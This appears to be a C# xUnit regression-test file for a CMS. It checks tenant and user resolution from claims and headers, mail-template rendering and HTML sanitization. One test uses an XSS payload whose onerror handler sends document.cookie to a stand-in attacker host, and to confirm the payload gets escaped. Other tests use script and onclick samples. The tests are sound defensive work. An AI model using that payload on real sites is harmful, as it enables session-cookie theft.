using System.Security.Claims;
using Codeji.CMS.Utility;
using Codeji.CMS.Utility.Helpers;
using Codeji.CMS.Utility.middlewares;
using Microsoft.AspNetCore.Http;
using Moq;

namespace Codeji.CMS.Services.Tests;

/// <summary>
/// Tenant-resolution and mail-templating regression tests. Everything here is
/// in-memory (DefaultHttpContext / static helpers) - no database, no SMTP.
/// </summary>
public sealed class RequestContextAndTemplatingTests
{
    [Fact]
    public void ProfessionalEmailWrapper_ProvidesBrandedAccessibleStructure()
    {
        var rendered = Emailer.BuildProfessionalHtmlBody("<p>Leave approved.</p>");

        Assert.Contains("<!doctype html>", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Leave approved.", rendered, StringComparison.Ordinal);
        Assert.Contains("automated message", rendered, StringComparison.OrdinalIgnoreCase);
    }

    private static IHttpContextAccessor Accessor(HttpContext context)
    {
        var accessor = new Mock<IHttpContextAccessor>();
        accessor.SetupGet(x => x.HttpContext).Returns(context);
        return accessor.Object;
    }

    private static HttpContext Authenticated(params Claim[] claims)
    {
        var context = new DefaultHttpContext();
        context.User = new ClaimsPrincipal(new ClaimsIdentity(claims, "TestAuth"));
        return context;
    }

    [Fact]
    public void CompanyId_ForAuthenticatedRequest_ComesFromTheJwtClaim()
    {
        var context = Authenticated(new Claim("company_id", "company-alpha"));
        context.Request.Headers["cId"] = "company-beta";

        Assert.Equal("company-alpha", CurrentContext.CompanyId(Accessor(context)));
    }

    /// <summary>
    /// BUG-03. Anonymous requests should not be able to choose the tenant from a caller-
    /// supplied header. The repository should only use tenant context that was resolved from
    /// trusted auth state or an explicitly allow-listed public endpoint.
    /// </summary>
    [Fact]
    public void CompanyId_ForAnonymousRequest_DoesNotTrustCallerSuppliedHeader()
    {
        var context = new DefaultHttpContext();
        context.Request.Headers["cId"] = "company-beta";

        Assert.Equal(string.Empty, CurrentContext.CompanyId(Accessor(context)));
    }

    [Fact]
    public void CompanyId_ForAnonymousPublicRequest_DoesNotTrustCallerSuppliedHeader()
    {
        var context = new DefaultHttpContext();
        context.Request.Path = "/api/company/career";
        context.Request.Headers["cId"] = "company-beta";

        Assert.Equal(string.Empty, CurrentContext.CompanyId(Accessor(context)));
    }

    /// <summary>
    /// BUG-04. UserId/CompanyId/RoleId should reject malformed principals without throwing
    /// an unhandled exception. Duplicate claims should be treated as invalid and yield no
    /// resolved value so the request can fail closed as unauthorized.
    /// </summary>
    [Fact]
    public void UserId_WithDuplicateClaim_ReturnsEmptyInsteadOfThrowing()
    {
        var context = Authenticated(
            new Claim("user_id", "user-alpha"),
            new Claim("user_id", "user-beta"));

        Assert.Equal(string.Empty, CurrentContext.UserId(Accessor(context)));
    }

    [Fact]
    public void UserId_ForAnonymousRequest_IsEmpty()
    {
        Assert.Equal(string.Empty, CurrentContext.UserId(Accessor(new DefaultHttpContext())));
    }

    /// <summary>
    /// BUG-05. HtmlTemplate.Render is a raw String.Replace with no HTML encoding, and
    /// PublicCareerService.QueueApplicationNotifications feeds it unauthenticated public
    /// applicant input (CandidateName / CandidateEmail / CandidatePhone) before mailing the
    /// result to internal Administrator and HR recipients.
    /// </summary>
    [Fact]
    public void MailTemplate_EscapesUntrustedValues()
    {
        const string hostileName = "<img src=x onerror=\"fetch('https://attacker.test/'+document.cookie)\">";

        var rendered = HtmlTemplate.Render(
            "<p>Name: [CandidateName]</p><p>Email: [CandidateEmail]</p>",
            new { CandidateName = hostileName, CandidateEmail = "victim@yopmail.com" });

        Assert.Contains("&lt;img", rendered, StringComparison.Ordinal);
        Assert.DoesNotContain("<img", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("victim@yopmail.com", rendered, StringComparison.Ordinal);
    }

    /// <summary>
    /// Replacement values must not be processed as template syntax. A candidate whose
    /// name is literally "[CandidateEmail]" must not expose another field.
    /// </summary>
    [Fact]
    public void MailTemplate_DoesNotExpandPlaceholdersFoundInsideValues()
    {
        var rendered = HtmlTemplate.Render(
            "<p>Hello [CandidateName]</p>",
            new { CandidateName = "[CandidateEmail]", CandidateEmail = "victim@yopmail.com" });

        Assert.Contains("[CandidateEmail]", rendered, StringComparison.Ordinal);
        Assert.DoesNotContain("victim@yopmail.com", rendered, StringComparison.Ordinal);
    }

    [Fact]
    public void MailTemplate_ReplacesRepeatedTokensAndPreservesUnknownTokens()
    {
        var rendered = HtmlTemplate.Render(
            "Hello [Name], [Name]. Your manager is [Manager]; [Unknown] remains.",
            new { Name = "Satyam", Manager = "Aarav" });

        Assert.Equal(
            "Hello Satyam, Satyam. Your manager is Aarav; [Unknown] remains.",
            rendered);
    }

    [Fact]
    public void Sanitizer_StripsScriptAndEventHandlers()
    {
        var sanitized = Sanitizer.EncodingHtmlText(
            "<p onclick=\"steal()\">hi</p><script>alert(1)</script>");

        Assert.DoesNotContain("script", sanitized, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", sanitized, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SanitizeProperties_FailsClosedWhenAPropertyCannotBeRead()
    {
        var exception = Assert.Throws<InvalidOperationException>(
            () => Sanitizer.SanitizeProperties(new BrokenSanitizableModel()));

        Assert.Contains(nameof(BrokenSanitizableModel.Content), exception.Message, StringComparison.Ordinal);
    }

    /// <summary>
    /// Sanitizer.EncodingHtmlText should preserve encoded entities and remain idempotent.
    /// Re-applying sanitization should not introduce new HTML or decode entities that were
    /// already escaped.
    /// </summary>
    [Fact]
    public void Sanitizer_PreservesEncodedEntitiesAndRemainsIdempotent()
    {
        var once = Sanitizer.EncodingHtmlText("Tom &amp; Jerry");
        Assert.Equal("Tom &amp; Jerry", once);

        var literalTag = Sanitizer.EncodingHtmlText("&lt;b&gt;not bold&lt;/b&gt;");
        var twice = Sanitizer.EncodingHtmlText(literalTag);

        Assert.Equal(literalTag, twice);
        Assert.DoesNotContain("<b>", twice, StringComparison.Ordinal);
    }

    private sealed class BrokenSanitizableModel
    {
        [Sanitize]
        public string Content
        {
            get => throw new InvalidOperationException("Test getter failure.");
            set { }
        }
    }
}
